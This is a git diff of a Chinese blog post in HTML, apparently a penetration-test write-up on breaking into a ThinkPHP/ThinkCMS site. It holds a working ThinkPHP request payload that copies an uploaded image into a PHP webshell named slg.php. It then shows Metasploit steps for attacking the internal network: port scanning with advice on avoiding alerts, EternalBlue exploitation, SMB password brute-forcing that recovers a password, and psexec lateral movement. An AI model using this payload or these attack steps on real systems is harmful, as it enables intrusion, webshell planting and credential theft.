@@ -83,7 +83,7 @@
 <pre><code>    打码处为图片的绝对路径，从页面中可获取到网站绝对路径
   _method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=/www/wwwroot/xxx/public/upload/avatar/20201119/c137f26076ea44d2a25a6992b1ae1437.png&amp;A=copy(&#39;/www/wwwroot/xxx/public/upload/avatar/20201119/c137f26076ea44d2a25a6992b1ae1437.png&#39;,&#39;/www/wwwroot/xxxx/public/upload/avatar/20201119/slg.php&#39;);
 
-  注意:A=copy中的A为马的密码</code></pre>
+  注意:A=copy中的A为马的密码,标点符号也不能少</code></pre>
 <p><img src="/images/pasted-31.png" alt="upload successful"></p>
 <p>4、访问马并连接</p>
 <p><img src="/images/pasted-32.png" alt="upload successful"></p>
@@ -102,9 +102,28 @@
 <pre><code>    既然权限低，就试试提权，直接用msf提权检测模块检测一波
     multi/recon/local_exploit_suggester，检测出一个，去试试看能否成功返回shell，不过后续也没提权成功。。我又扫了下端口，发现只有个BT,权限不高，还没法子知道路径及密码，最后也就先放弃了，打算不提权了，直接当跳板机使用。</code></pre>
 <p><img src="/images/pasted-40.png" alt="upload successful"></p>
-<p>7、扫描内网</p>
+<p>7、内网攻击</p>
 <pre><code>  查看路由并添加</code></pre>
 <p><img src="/images/pasted-42.png" alt="upload successful"></p>
+<pre><code>  然后就需要探测内网哪写主机为存活了
+  auxiliary/scanner/portscan/tcp；我们使用这个模块对内网进行探测扫描，这里为了快速扫描，我设置的20线程，只扫描了445端口，但是在实战中不能设置这么高的线程，容易触发告警！</code></pre>
+<p><img src="/images/pasted-44.png" alt="upload successful"></p>
+<p><img src="/images/pasted-45.png" alt="upload successful"></p>
+<pre><code>     发现一个windows服务器128开着445，永恒之蓝打一波
+     使用auxiliary/scanner/smb/smb_ms17_010模块，先检测一波漏洞是否存在 </code></pre>
+<p><img src="/images/pasted-46.png" alt="upload successful"></p>
+<pre><code>     发现漏洞存在，直接使用模块攻击，因为内网128主机不出网，所以payload使用正向bind连接
+     exploit/windows/smb/ms17_010_eternalblue</code></pre>
+<p><img src="/images/pasted-47.png" alt="upload successful"></p>
+<pre><code>      好吧，我发现没返回shell，也正常，毕竟只要有个杀软就基本返回不来shell。</code></pre>
+<p><img src="/images/pasted-49.png" alt="upload successful"></p>
+<pre><code>       好吧，我们只能尝试其他方式了，既然开着445，就爆破一波试试
+       使用auxiliary/scanner/smb/smb_login模块，指定ip、字典,用户名等，开搞，还是不错的，跑出来了！！密码为admin2008</code></pre>
+<p><img src="/images/pasted-51.png" alt="upload successful"></p>
+<p><img src="/images/pasted-52.png" alt="upload successful"></p>
+<pre><code>       既然跑出密码了，我们就开始利用它
+       使用use exploit/windows/smb/psexec模块进行445利用，设置他的smb的账户密码，payload为正向bind，因为它不出网，只能我们去连接它！</code></pre>
+<p><img src="/images/pasted-53.png" alt="upload successful"></p>
 <div id="gitalk-container"></div>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
 <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
@@ -124,7 +143,7 @@ gitalk.render('gitalk-container')
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/thinkphp-thinkcms%E7%BB%84%E5%90%88%E6%8B%B3getshell/" data-id="ckht18g1q0005ssut0n1da9i4"
+      <a data-url="http://example.com/2020/11/19/thinkphp-thinkcms%E7%BB%84%E5%90%88%E6%8B%B3getshell/" data-id="ckhw5lpse0004cwut4vc76fqc"
          class="article-share-link">分享</a>
       
     </footer>
